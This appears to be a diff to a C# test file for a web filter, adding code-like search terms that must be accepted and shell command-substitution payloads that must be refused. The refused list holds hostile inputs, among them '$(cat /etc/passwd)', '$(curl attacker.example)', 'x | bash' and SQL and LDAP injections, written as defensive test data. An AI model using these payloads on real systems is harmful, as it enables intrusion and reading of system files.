@@ -43,6 +43,11 @@ public class OrdinaryWordsAreNotInjectionTests
     [InlineData("L'Oréal")]
     [InlineData("Meier & Söhne (Hamburg)")]
     [InlineData("What does that mean; and why?")]
+    // A portfolio is where people describe the code they wrote, so this is the
+    // normal case there — and it was refused until the substitution rule was
+    // made to name a command.
+    [InlineData("jQuery migration: replaced $(document).ready()")]
+    [InlineData("useEffect(() => { setLoading(false); }, []);")]
     public async Task An_ordinary_search_term_is_answered(string term)
     {
         var status = await Ask($"/echo?q={Uri.EscapeDataString(term)}");
@@ -66,6 +71,8 @@ public class OrdinaryWordsAreNotInjectionTests
     [InlineData("x | bash")]
     [InlineData("'; WAITFOR DELAY '0:0:5' --")]
     [InlineData("test)(objectClass=*")]
+    [InlineData("$(cat /etc/passwd)")]
+    [InlineData("$(curl attacker.example)")]
     public async Task An_injection_is_refused(string attack)
     {
         var status = await Ask($"/echo?q={Uri.EscapeDataString(attack)}");
